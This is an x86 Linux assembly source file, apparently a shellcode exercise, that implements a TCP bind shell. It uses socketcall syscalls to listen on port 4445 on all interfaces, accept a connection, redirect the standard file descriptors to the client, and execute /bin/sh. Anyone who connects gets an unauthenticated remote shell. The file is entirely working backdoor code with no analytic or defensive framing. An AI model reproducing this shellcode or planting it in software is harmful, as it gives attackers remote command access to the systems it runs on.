; File: bind_tcp.asm
; Author: NiAllen Macy

global main

section .text
main:
	; sock = socket(AF_INET, SOCK_STREAM, IPPROTO)
	push 0x66
	pop eax
	push 0x1
	pop ebx ; bl = 1
	cdq
	push edx
	push ebx
	push 0x2
	mov ecx, esp
	int 0x80
	mov esi, eax

	; bind(sock, [AF_INET, PORT, IPADDR_ANY], 16)
	mov al, 0x66
	inc bl ; bl = 2
	push edx
	push word 0x5d11
	push word bx
	mov ecx, esp
	push 0x10
	push ecx
	push esi
	mov ecx, esp
	int 0x80

	; listen(sock, 0)
	mov al, 0x66
	mov bl, 0x4
	push edx
	push esi
	mov ecx, esp
	int 0x80

	; client = accept(sock, 0, 0)
	mov al, 0x66
	inc bl ; bl = 5
	push edx
	push edx
	push esi
	mov ecx, esp
	int 0x80
	mov esi,eax

	; dup2(sock, [0-2])
	mov ecx, edx
	xchg ebx, esi
	dup2:
	mov al, 0x3f
	int 0x80
	inc cl
	cmp cl, 0x4
	jne dup2

	; execve("/bin/sh",*"bin/sh",0)
	mov al, 0xb
	push edx
	push dword 0x68732f2f
    push dword 0x6e69622f
	mov ebx, esp
	push edx
	push ebx
	mov ecx, esp
	int 0x80
